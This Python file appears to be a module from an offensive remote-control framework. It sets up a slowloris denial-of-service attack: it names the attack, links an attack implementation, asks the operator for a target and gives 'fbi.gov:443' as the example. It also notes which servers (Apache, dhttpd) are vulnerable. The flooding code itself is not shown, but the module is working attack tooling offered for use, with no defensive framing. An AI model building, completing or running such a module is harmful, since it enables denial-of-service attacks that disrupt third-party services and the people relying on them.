# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author": ["Marten4n6"],
            "Description": "Perform a slowloris DoS attack.",
            "References": [
                "https://en.wikipedia.org/wiki/Slowloris_(computer_security)",
                "https://github.com/ProjectMayhem/PySlowLoris"
            ],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        target = self._view.prompt("Target to attack (example: fbi.gov:443): ", [
            ("This attack only works on Apache 1x, 2x, dhttpd, and some other minor servers.", "attention"),
            ("Servers like nginx are not vulnerable to this form of attack.", "attention"),
            ("If no port is specified 80 will be used.", "info")
        ])

        if not target:
            return False, None
        else:
            return True, {
                "target": target
            }
